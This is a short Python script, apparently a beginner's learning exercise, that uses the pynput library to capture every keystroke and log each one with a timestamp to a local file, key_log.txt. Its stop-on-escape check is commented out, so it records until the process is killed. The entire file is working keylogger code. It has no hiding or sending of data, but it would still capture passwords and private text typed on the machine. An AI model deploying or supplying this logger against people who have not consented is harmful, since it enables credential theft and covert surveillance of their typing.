#library
from pynput.keyboard import Key, Listener
#vanilla
import logging

#if no name for directory, it gets put into an empty string
#make a log file
log_dir = ""

# this is a function from the 
# sets file to log to with file name and path, sets debugging level to logging, formats messages and keylogs in ascending time order
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format = '%(asctime)s: %(message)s:')

#this is from the library
def on_press(key):
    logging.info(str(key))
    # logging can end if the escape key is pushed
    #if key == Key.esc:
        #return false

#the listener is listening to the keyboard on press as a listener
#this says the listener is on
with Listener(on_press=on_press) as listener:
    listener.join()
